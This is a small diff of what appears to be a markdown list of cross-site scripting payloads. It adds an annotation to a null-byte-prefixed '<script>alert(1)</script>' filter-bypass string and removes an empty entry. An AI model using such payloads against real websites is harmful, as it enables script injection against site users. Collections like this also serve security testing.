@@ -175,9 +175,8 @@ Try to use this payloads :
 6) <script>/&/-alert(1)</script>
 <script>/&amp;/-alert(1)</script>
 
-7) %00%00%00%00%00%00%00<script>alert(1)</script>
+7) %00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)
 
-8) 
 
 ```
 
